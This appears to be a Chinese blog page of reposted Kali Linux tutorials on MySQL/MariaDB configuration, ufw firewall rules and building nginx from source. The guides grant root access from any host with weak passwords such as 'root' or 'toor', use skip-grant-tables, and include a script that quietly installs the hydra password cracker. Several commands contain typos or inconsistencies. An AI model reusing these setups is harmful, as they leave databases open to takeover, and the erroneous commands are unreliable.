64Ginnodb_additional_mem_pool_size　　= 32MBinnodb_data_file_path　　=　ibdata1:1G;ibdata2:1G:autoextendinnodb_read_io_threads　　= 8innodb_write_io_threads 　　= 8innodb_file_per_table　　= 1innodb_flush_log_at_thx_commit　　= 2innodb_lock_wait_timeout　　= 120innodb_log_buffer_size　　= 8MBinnodb_log_file_size　　= 256MBinnodb_log_files_in_group　　= 3innodb_max_dirty_pages_pct　　= 90innodb_thread_concurrency　　= 16innodb_open_files　　= 10000#innodb_force_recovery　　= 4#replication slaveread-only#skip-salve-startrelay-log　　= relay.loglog-slave-updates</span><br></pre></td></tr></table></figure>

<p>本文参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.centos.bz/2018/02/mariadb-mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6my-cnf%E8%A7%A3%E8%AF%BB/">https://www.centos.bz/2018/02/mariadb-mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6my-cnf%E8%A7%A3%E8%AF%BB/</a></p>
<h1 id="kali开启端口、关闭防火墙方法"><a href="#kali开启端口、关闭防火墙方法" class="headerlink" title="kali开启端口、关闭防火墙方法"></a>kali开启端口、关闭防火墙方法</h1><p>发布时间：2020年02月28日 阅读：13178 次</p>
<p>先安装ufw命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ufw</span><br></pre></td></tr></table></figure>

<p>ufw命令用法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">检查防火墙的状态（默认 inactive） <span class="comment"># ufw status			防火墙版本  ufw version</span></span><br><span class="line">启动ufw防火墙 <span class="comment"># ufw enable							关闭ufw防火墙 # ufw disable</span></span><br><span class="line">默认禁止访问所有 <span class="comment"># ufw default deny					   开放22/TCP端口 # ufw allow 22/tcp</span></span><br><span class="line">开放53端口(tcp/udp) <span class="comment"># ufw allow 53					  禁止外部访问 # ufw deny 3306</span></span><br><span class="line">删除已经添加过的规则 <span class="comment"># ufw delete allow 22			  允许此IP访问所有的本机端口 # ufw allow from 192.168.1.100						</span></span><br><span class="line">删除上面的规则 <span class="comment"># ufw delete allow from 192.168.1.100</span></span><br><span class="line">查看规则，显示行号 <span class="comment"># ufw status numbered				   删除第三条规则 # ufw delete 3</span></span><br><span class="line">关闭ufw <span class="comment"># ufw disable								   禁止对8888端口的访问 # ufw deny 8888</span></span><br><span class="line">打开来自192.168.0.1的tcp请求的22端口 <span class="comment"># ufw allow proto tcp from 192.168.0.1 to any port 22</span></span><br></pre></td></tr></table></figure>

<h1 id="kali-linux如何打开mysql-Navicat联接kali-Linux中的mysql"><a href="#kali-linux如何打开mysql-Navicat联接kali-Linux中的mysql" class="headerlink" title="kali linux如何打开mysql,Navicat联接kali Linux中的mysql"></a>kali linux如何打开mysql,Navicat联接kali Linux中的mysql</h1><p><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/reprint.png" alt="img"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_29838739">Xenophon Tony</a><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCurrentTime2.png" alt="img">于 2021-05-07 00:25:32 发布<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png" alt="img">579</p>
<p>文章标签： <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search/s.do?q=kali+linux%E5%A6%82%E4%BD%95%E6%89%93%E5%BC%80mysql&t=blog&o=vip&s=&l=&f=&viparticle=">kali linux如何打开mysql</a></p>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Navicat&spm=1001.2101.3001.7020">Navicat</a>联接kali Linux中的mysql</p>
<p>一. 在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a>中默认已安装mysql</p>
<p>service mysql start 开启mysql服务</p>
<p>ps aux|<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=grep&spm=1001.2101.3001.7020">grep</a> mysql 查看是否开启mysql服务</p>
<p>service mysql stop 关闭服务</p>
<p>service mysql status查看服务的当前状态也</p>
<p>service mysql restart 重新开启服务</p>
<p>注释：如果没有安装，可以使用sudo apt-get install mysql-server</p>
<p>二，配置mysql</p>
<p>vim /etc/mysql/mysql/mysql.conf.d/mysql.cnf</p>
<p>将bind-address = 127.0.0.0 修改为 0.0.0.0</p>
<p>三，修改mysql的用户</p>
<p>在kali中mysql的默认账号为</p>
<p>账户：root 密码为无</p>
<p>直接输入 mysql 可以进入</p>
<p>如果需要修改密码 ：</p>
<p>1，mysql</p>
<p>2，show databases; 查看数据库中所有的数据库</p>
<p>3，use mysql； 使用mysql数据库</p>
<p>4，show tables; 查看叫mysql的数据库中所有的表</p>
<p>5，update user set password=password(‘toor’) where user=’root’; 设置密码</p>
<p>6，flush privileges;刷新</p>
<p>四，修改mysql的权限，可以让其他主机访问到</p>
<p>在mysql命令行中输入：</p>
<p>GREANT ALL PRIVILEGES ON . TO ‘root(用户名)’ IDENTIFIED BY ‘toor(密码)’ WITH GRANT OPTION;</p>
<p>flush privileges;</p>
<p>五，下载安装Navicat</p>
<p><a target="_blank" rel="noopener" href="http://http//download.csdn.net/detail/muier/9189743">http://http://download.csdn.net/detail/muier/9189743</a></p>
<p>输入ip地址，账号密码，点击连接测试，成功后，点击确定进入数据库。</p>
<h1 id="kali-安装nginx服务器"><a href="#kali-安装nginx服务器" class="headerlink" title="kali 安装nginx服务器"></a>kali 安装nginx服务器</h1><p><a target="_blank" rel="noopener" href="https://www.zhihu.com/people/barrypro"><img src="https://pic3.zhimg.com/v2-a2875c81b552fc2dd2119c8f1e9c850e_xs.jpg?source=172ae18b" alt="BarryPro"></a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/people/barrypro">BarryPro</a><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/48510028"></a></p>
<h3 id="1-去官网下载最新版的安装包，以nginx-1-16-1为例"><a href="#1-去官网下载最新版的安装包，以nginx-1-16-1为例" class="headerlink" title="1.去官网下载最新版的安装包，以nginx-1.16.1为例"></a>1.去官网下载最新版的安装包，以nginx-1.16.1为例</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nginx.org/download/nginx-1.16.1.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="2-解压tar-gz-文件到指定路径"><a href="#2-解压tar-gz-文件到指定路径" class="headerlink" title="2.解压tar.gz 文件到指定路径"></a>2.解压tar.gz 文件到指定路径</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf nginx-1.16.1.tar.gz -C /home/root/moudle/</span><br><span class="line">cd /home/root/moudle/</span><br><span class="line"># 这个路径是源码路径</span><br><span class="line">cd nginx-1.16.1</span><br><span class="line"># --prefix 后面指定的是编译后的nginx软件的安装路径，这一步可能会报错，如果报错就按照第3步来</span><br><span class="line">./configure --prefix=/home/root/nginx</span><br></pre></td></tr></table></figure>

<h3 id="3-缺少pcre包解决"><a href="#3-缺少pcre包解决" class="headerlink" title="3.缺少pcre包解决"></a>3.缺少pcre包解决</h3><h3 id="3-1报错详情"><a href="#3-1报错详情" class="headerlink" title="3.1报错详情"></a>3.1报错详情</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure: error: the HTTP rewrite module requires the PCRE library. You can either disable the module by using </span><br><span class="line">--without-http_rewrite_module option, or install the PCRE library into the system, or build the PCRE library statically</span><br><span class="line">from the source with nginx by using --with-pcre= option. </span><br></pre></td></tr></table></figure>

<h3 id="3-2解决方法"><a href="#3-2解决方法" class="headerlink" title="3.2解决方法"></a>3.2解决方法</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 下载最新版的pcre包</span><br><span class="line">https://sourceforge.net/projects/pcre/files/latest/download</span><br></pre></td></tr></table></figure>

<h3 id="4-指定pcre源码包路径继续安装"><a href="#4-指定pcre源码包路径继续安装" class="headerlink" title="4.指定pcre源码包路径继续安装"></a>4.指定pcre源码包路径继续安装</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 安装pcre2</span><br><span class="line">cd /home/root/moudle/pcre2-10.33</span><br><span class="line">./configure</span><br><span class="line">make install</span><br><span class="line"># /home/root/moudle/nginx-1.16.1</span><br><span class="line">./configure --prefix=/home/root/nginx --with-pcre=/home/root/pcre2-10.33</span><br></pre></td></tr></table></figure>

<h3 id="5-缺少zlib包"><a href="#5-缺少zlib包" class="headerlink" title="5.缺少zlib包"></a>5.缺少zlib包</h3><h3 id="5-1报错详情"><a href="#5-1报错详情" class="headerlink" title="5.1报错详情"></a>5.1报错详情</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure: error: the HTTP gzip module requires the zlib library. You can either disable the module by using</span><br><span class="line">--without-http_gzip_module option, or install the zlib library into the system, or build the zlib library statically</span><br><span class="line">from the source with nginx by using --with-zlib= option. </span><br></pre></td></tr></table></figure>

<h3 id="5-2解决方法"><a href="#5-2解决方法" class="headerlink" title="5.2解决方法"></a>5.2解决方法</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 下载最新的zlib包</span><br><span class="line">http://www.zlib.net/zlib-1.2.11.tar.gz</span><br><span class="line"># 同第1步的解压一样，进入解压后的文件夹</span><br><span class="line">./configure</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<h3 id="6-安装完依赖包后重新生成Makefile文件"><a href="#6-安装完依赖包后重新生成Makefile文件" class="headerlink" title="6.安装完依赖包后重新生成Makefile文件"></a>6.安装完依赖包后重新生成Makefile文件</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/home/root/nginx --with-pcre=/home/root/pcre2-10.33</span><br></pre></td></tr></table></figure>

<h3 id="7-使用make编译并安装nginx服务器"><a href="#7-使用make编译并安装nginx服务器" class="headerlink" title="7.使用make编译并安装nginx服务器"></a>7.使用make编译并安装nginx服务器</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /home/root/moudle/nginx-1.16.1</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h3 id="8-编译软件继续报错……"><a href="#8-编译软件继续报错……" class="headerlink" title="8.编译软件继续报错……"></a>8.编译软件继续报错……</h3><h3 id="8-1报错详情"><a href="#8-1报错详情" class="headerlink" title="8.1报错详情"></a>8.1报错详情</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/root/module/pcre2-10.33 \ &amp;&amp; make libpcre.la make[2]: 进入目录“/home/root/module/pcre2-10.33” make[2]:  </span><br><span class="line">没有规则可制作目标“libpcre.la”。 停止。 make[2]: 离开目录“/home/root/module/pcre2-10.33” make[1]:  [objs/Makefile:1209：/</span><br><span class="line">home/root/module/pcre2-10.33/.libs/libpcre.a] 错误 2 make[1]: 离开目录“/home/root/module/nginx-1.16.1” make: *** [</span><br><span class="line">Makefile:8：build] 错误 2 </span><br></pre></td></tr></table></figure>

<h3 id="8-2解决方法"><a href="#8-2解决方法" class="headerlink" title="8.2解决方法"></a>8.2解决方法</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 原来是nginx不支持pcre2报错找不到文件，重新下载pcre-8.43</span><br><span class="line">https://ftp.pcre.org/pub/pcre/pcre-8.43.tar.gz</span><br><span class="line"># 重复第4步 安装pcre</span><br></pre></td></tr></table></figure>

<h3 id="9-进入nginx的安装目录开始使用服务器"><a href="#9-进入nginx的安装目录开始使用服务器" class="headerlink" title="9.进入nginx的安装目录开始使用服务器"></a>9.进入nginx的安装目录开始使用服务器</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/root/nginx</span><br><span class="line">cd sbin</span><br><span class="line"># 查看nginx服务器版本</span><br><span class="line">./nginx -v</span><br></pre></td></tr></table></figure>

<h3 id="9-1-版本信息"><a href="#9-1-版本信息" class="headerlink" title="9.1 版本信息"></a>9.1 版本信息</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  sbin ./nginx -v</span><br></pre></td></tr></table></figure>

<p>nginx version: nginx/1.16.1</p>
<h3 id="9-2-显示更多详细信息"><a href="#9-2-显示更多详细信息" class="headerlink" title="9.2 显示更多详细信息"></a>9.2 显示更多详细信息</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  sbin ./nginx -V nginx version: nginx/1.16.1 built by gcc 9.2.1 </span><br><span class="line">20190821 (Debian 9.2.1-4)  configure arguments: </span><br><span class="line">--prefix=/home/root/nginx --with-pcre=/home/root/module/pcre-8.43 </span><br></pre></td></tr></table></figure>

<h1 id="kali-mysql安装教程-Kali中安装mysql自动安装脚本"><a href="#kali-mysql安装教程-Kali中安装mysql自动安装脚本" class="headerlink" title="kali mysql安装教程_Kali中安装mysql自动安装脚本"></a>kali mysql安装教程_Kali中安装mysql自动安装脚本</h1><p>查看创建的mysql用户：</p>
<p>cat /etc/passwd | grep mysql</p>
<p>安装步骤：</p>
<p>1.先删除mariadb</p>
<p>apt-get autoremove –purge mariadb-client-core-10.3</p>
<p>apt-get autoremove –purge</p>
<p>2.把mysql的压缩包文件放入到/usr/local</p>
<p>3.执行解压命令</p>
<p>tar -zxvf mysql-5.7.20-linux-glibc2.12-x86_64.tar.gz</p>
<p>4.修改文件名</p>
<p>mv mysql-5.7.20-linux-glibc2.12-x86_64 mysql</p>
<p>5.创建用户：</p>
<p>userdel mysql</p>
<p>groupadd mysql</p>
<p>useradd -r -g mysql mysql</p>
<p>chown -R mysql:mysql mysql</p>
<p>6.切换到mysql用户：</p>
<p>su mysql</p>
<p>7.进入到安装目录：</p>
<p>cd mysql</p>
<p>./bin/mysqld –initialize –user=mysql –basedir=/usr/local/mysql –datadir=/usr/local/mysql/data</p>
<p>9.exit退出mysql用户</p>
<p>10.拷贝文件：</p>
<p>cp support-files/mysql.server /etc/init.d/mysql</p>
<p>cp support-files/my-default.cnf /etc/my.cnf (5.7没有这个文件，自己找一个)</p>
<p>cp bin/mysql /usr/bin/</p>
<p>11.创建log文件输出路径：</p>
<p>mkdir log</p>
<p>touch log/mysqld.log</p>
<p>chown -R mysql:mysql log/</p>
<p>chmod -R 755 log/mysqld.log</p>
<p>12.修改配置文件vim /etc/init.d/mysql</p>
<p>basedir=/usr/local/mysql</p>
<p>datadir=/usr/local/mysql/data (这个拷贝文件中如果添加，就不需要改了)</p>
<p>修改下配置文件：vim /etc/my.cnf</p>
<p>[client]</p>
<p>default-character-set=utf8</p>
<p>[mysqld]</p>
<p>character-set-server=utf8</p>
<p>datadir=/usr/local/mysql/data</p>
<p>basedir=/usr/local/mysql</p>
<p>socket=/tmp/mysql.sock</p>
<p>max_heap_table_size = 512M</p>
<p>[mysqld_safe]</p>
<p>log-error=/usr/local/mysql/log/mysqld.log</p>
<p>另外将被注释掉的innodb_buffer_pool_size = 128M放开(缺省值是8M，在批量插入数据过多时会产生错误，memsql设置128即可，MySQL需要设置为9G)</p>
<p>启动数据库：</p>
<p>service mysql start</p>
<p>运行命令：vi /etc/my.cnf，编辑文件</p>
<p>在文件的[mysqld]标签下添加一句：skip-grant-tables</p>
<p>service mysql stop</p>
<p>service mysql start</p>
<p>进入数据库：mysql -u root</p>
<p>使用数据库：use mysql;</p>
<p>运行：</p>
<p>update mysql.user set authentication_string=password(‘root’) where user=’root’;</p>
<p>root_password替换成你想要的密码</p>
<p>exit退出</p>
<p>把my.conf的skip-grant-tables删除，重启数据库，</p>
<p>修改自己的账号：</p>
<p>ALTER USER ‘root‘@’localhost’ IDENTIFIED BY ‘root’;</p>
<p>刷新权限</p>
<p>flush privileges;</p>
<p>退出：</p>
<p>quit;</p>
<p>设置访问权限：</p>
<p>GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘root’ WITH GRANT OPTION;</p>
<p>刷新访问权限表</p>
<p>flush privileges;</p>
<p>刷新服务：</p>
<p>service mysql restart</p>
<p>重启服务：</p>
<p>service mysql restart;</p>
<p>添加用户：</p>
<p>CREATE USER ‘用户名‘@’localhost’ IDENTIFIED BY ‘密码’;</p>
<p>自动安装脚本：网上的好多都不能用。</p>
<p>#!/bin/bash</p>
<p>#coding: utf-8</p>
<p>#filename: mysql_install.sh</p>
<p>#version: 1.0</p>
<p>#desc: mysql-5.7.28-linux-glibc2.12-x86_64.tar.gz 安装脚本</p>
<p>#attention: 需要 root 用户执行</p>
<p>echo ‘1、判断当前用户是否为root用户’</p>
<p>if [ $(id -u) != “0” ];then</p>
<p>echo “error: you must be root run this script”</p>
<p>exit 1</p>
<p>fi</p>
<p>echo ‘2、定义变量’</p>
<p>WKDIR=$(pwd)</p>
<p>INSTALL_HOME=”/opt/module”</p>
<p>MYSQL_HOME=”$INSTALL_HOME/mysql5.7”</p>
<p>MYSQL_DATA=”$MYSQL_HOME/data”</p>
<p>MYSQLD_HOME=”/var/run/mysqld/mysqld.sock”</p>
<p>[ -d $INSTALL_HOME ] || mkdir -p $INSTALL_HOME</p>
<p>echo ‘ 3、检验安装目录’</p>
<p>if [ -d $MYSQL_HOME ];then</p>
<p>echo “erro: your system have installed mysql”</p>
<p>exit 1</p>
<p>fi</p>
<p>echo ‘ 4、卸载系统自带数据库’</p>
<p>apt-get remove mariadb* -y</p>
<p>apt-get remove mysql-common -y</p>
<p>echo ‘5、开始安装’</p>
<p>echo “start installing mysql”</p>
<p>echo ‘ 解压’</p>
<p>echo “start tar…”</p>
<p>tar -xf mysql-5.7.28-linux-glibc2.12-x86_64.tar.gz</p>
<p>mv mysql-5.7.28-linux-glibc2.12-x86_64 $MYSQL_HOME</p>
<p>echo “tar complete”</p>
<p>[ -d $MYSQL_DATA ] || mkdir -p $MYSQL_DATA</p>
<p>echo ‘ 创建用户’</p>
<p>id mysql &gt; /dev/null 2&gt;&amp;1</p>
<p>if [ $? -ne 0 ];then</p>
<p>useradd -s /sbin/nologin -M mysql</p>
<p>fi</p>
<p>echo ‘ 创建配置文件及日志目录’</p>
<p>mkdir -p $MYSQL_HOME/etc</p>
<p>mkdir -p $MYSQL_HOME/logs</p>
<p>mkdir -p $MYSQL_HOME/tmp</p>
<p>mkdir -p /var/run/mysqld</p>
<p>chown -R mysql:mysql /var/run/mysqld/</p>
<p>echo ‘ 更改 mysql 目录所属用户和组’</p>
<p>chown -R mysql:mysql $MYSQL_HOME</p>
<p>echo “initializing mysql”</p>
<p>echo ‘ 初始化 mysql 数据库’</p>
<p>$MYSQL_HOME/bin/mysqld –initialize –basedir=$MYSQL_HOME –datadir=$MYSQL_DATA –user=mysql</p>
<p>echo ‘ 创建配置文件’</p>
<p>cat &gt;$MYSQL_HOME/etc/my.cnf&lt;</p>
<p>[mysqld]</p>
<p>daemonize = on</p>
<p>user = mysql</p>
<p>port = 3306</p>
<p>skip-grant-tables</p>
<p>basedir = /opt/module/mysql5.7</p>
<p>datadir = /opt/module/mysql5.7/data</p>
<p>socket = /var/run/mysqld/mysqld.sock</p>
<p>pid-file = /opt/module/mysql5.7/tmp/mysqld.pid</p>
<p>log-error = /opt/module/mysql5.7/logs/mysqld.log</p>
<p>character-set-server=utf8</p>
<p>collation-server=utf8_general_ci</p>
<p>innodb_buffer_pool_size = 10G</p>
<p>innodb_log_file_size = 512M</p>
<p>max_heap_table_size=5120M</p>
<p>max_allowed_packet=100M</p>
<p>max_connections=1000</p>
<p>event_scheduler=ON</p>
<p>lower_case_table_names=1</p>
<p>sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</p>
<p>[client]</p>
<p>socket = /var/run/mysqld/mysqld.sock</p>
<p>default-character-set=utf8</p>
<p>EOF</p>
<p>echo ‘ 注册服务’</p>
<p>cat &gt;/lib/systemd/system/mysqld.service&lt;</p>
<p>[Unit]</p>
<p>Description=MySQL Server</p>
<p>Documentation=man:mysqld(8)</p>
<p>After=network.target</p>
<p>After=syslog.target</p>
<p>[Install]</p>
<p>WantedBy=multi-user.target</p>
<p>[Service]</p>
<p>User=mysql</p>
<p>Group=mysql</p>
<p>Type=forking</p>
<p>TimeoutSec=0</p>
<p>PermissionsStartOnly=true</p>
<p>ExecStart=/opt/module/mysql5.7/bin/mysqld –defaults-file=/opt/module/mysql5.7/etc/my.cnf</p>
<p>LimitNOFILE = 5000</p>
<p>Restart=on-failure</p>
<p>PrivateTmp=false</p>
<p>EOF</p>
<p>echo ‘ 配置环境变量’</p>
<p>cat &gt; /etc/profile.d/mysql.sh&lt;</p>
<p>export PATH=$PATH:/opt/module/mysql5.7/bin</p>
<p>EOF</p>
<p>echo ‘ 使配置的环境变量生效’</p>
<p>source /etc/profile.d/mysql.sh</p>
<p>cp $MYSQL_HOME/bin/mysql /usr/bin/</p>
<p>echo ‘ 启动服务’</p>
<p>systemctl start mysqld</p>
<p>systemctl enable mysqld</p>
<p>#按照hydra</p>
<p>cd $WKDIR</p>
<p>dpkg -i libmariadb3_1%3a10.3.22-1_amd64.deb mysql-common_5.8+1.0.5_all.deb libmariadb3_1%3a10.3.22-1_amd64.deb mariadb-common_1%3a10.3.22-1_all.deb hydra_9.0-1_amd64.deb</p>
<p>#设置开机启动</p>
<p>systemctl enable /lib/systemd/system/mysqld.service</p>
<p>echo “=======进入数据库=======”</p>
<p>mysql –socket=$MYSQLD_HOME -uroot -e “update mysql.user set authentication_string=password(‘root’) where user=’root’;”</p>
<p>echo “======删除my.conf中的skip-grant-tablese删除=====”</p>
<p>sed -i ‘5d’ /opt/module/mysql5.7/etc/my.cnf;</p>
<p>service mysqld restart</p>
<p>echo “=====设置root的访问权限=====”</p>
<p>mysql –socket=$MYSQLD_HOME -uroot -proot –connect-expired-password -e “alter user ‘root‘@’localhost’ identified by ‘’;”</p>
<p>mysql –socket=$MYSQLD_HOME -uroot -pblessme -e “GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘root’ WITH GRANT OPTION;”</p>
<p>echo “=====添加新的用户======”</p>
<p>mysql –socket=$MYSQLD_HOME -uroot -pblessme -e “CREATE USER ‘oms‘@’localhost’ IDENTIFIED BY ‘1234’;”</p>
<p>mysql –socket=$MYSQLD_HOME -uroot -pblessme -e “GRANT GRANT OPTION ON <em>.</em> TO ‘oms‘@’localhost’;”</p>
<p>mysql –socket=$MYSQLD_HOME -uroot -pblessme -e “GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, FILE, REFERENCES, INDEX, ALTER, SHOW DATABASES, SUPER, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER ON <em>.</em> TO ‘oms‘@’localhost’;”</p>
<p>mysql –socket=$MYSQLD_HOME -uroot -pblessme -e “ALTER USER ‘oms‘@’localhost’ IDENTIFIED WITH mysql_native_password BY ‘1234’;”</p>
<p>service mysqld restart</p>
<p>echo “开始创建 数据库”;</p>
<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 -e “create database dris_common default charset ‘utf8’ collate ‘utf8_bin’;”</p>
<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 -e “create database dris_state default charset ‘utf8’ collate ‘utf8_bin’;”</p>
<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 -e “create database dris_history default charset ‘utf8’ collate ‘utf8_bin’;”</p>
<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 -e “create database dris_asset default charset ‘utf8’ collate ‘utf8_bin’;”</p>
<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 -e “create database syslog default charset ‘utf8’ collate ‘utf8_bin’;”</p>
<p>mysql –socket=$MYSQLD_HOME -uoms -p1234 &lt;</p>
<p>use dris_common;</p>
<p>source sql/dris_common.sql;</p>
<p>use dris_state;</p>
<p>source sql/dris_state.sql;</p>
<p>use dris_history;</p>
<p>source sql/dris_history.sql;</p>
<p>use dris_asset;</p>
<p>source sql/dris_asset.sql;</p>
<p>EOF</p>
<p>echo “开始创建 数据库完成”;</p>
<h1 id="Kali–MariaDB安装-使用-改密-卸载一条龙"><a href="#Kali–MariaDB安装-使用-改密-卸载一条龙" class="headerlink" title="Kali–MariaDB安装,使用,改密,卸载一条龙"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/qinghemo/p/14342678.html">Kali–MariaDB安装,使用,改密,卸载一条龙</a></h1><h2 id="Kali-MariaDB安装使用"><a href="#Kali-MariaDB安装使用" class="headerlink" title="Kali-MariaDB安装使用"></a>Kali-MariaDB安装使用</h2><blockquote>
<p>据说mysql现在对kali收费,所以得用其他数据库代替,这里倒腾了下mariadb</p>
</blockquote>
<hr>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
<li>安装mariadb-client</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mariadb-client</span><br></pre></td></tr></table></figure>

<ol>
<li>安装mariadb-server</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mariadb-server</span><br></pre></td></tr></table></figure>

<ol>
<li>设置为开机启动服务</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable mysql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止开机启动可以用如下命令</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl <span class="built_in">disable</span> mysql</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>第一次使用时,需要初始化,此时设置登录数据库的密码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation </span><br></pre></td></tr></table></figure>

<h3 id="忘记密码"><a href="#忘记密码" class="headerlink" title="忘记密码"></a>忘记密码</h3><ol>
<li>知道数据库root密码需要修改,直接在shell修改</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -uroot -p[oldpassword] password newpassword</span><br></pre></td></tr></table></figure>

<ol>
<li>登录数据库修改</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"><span class="comment">-- 查看数据库用户信息</span></span><br><span class="line"><span class="keyword">select</span> host,<span class="keyword">user</span>,plugin,authentication_string <span class="keyword">from</span> mysql.user;</span><br><span class="line"><span class="comment">-- 修改密码</span></span><br><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">user</span> <span class="keyword">SET</span> password<span class="operator">=</span>password(<span class="string">&#x27;newpassword&#x27;</span>) <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="comment">-- 新版MySQL采用此SQL</span></span><br><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">user</span> <span class="keyword">SET</span> authentication_string<span class="operator">=</span>PASSWORD(<span class="string">&#x27;newpassword&#x27;</span>) <span class="keyword">where</span> <span class="keyword">USER</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="comment">-- 修改密码</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span 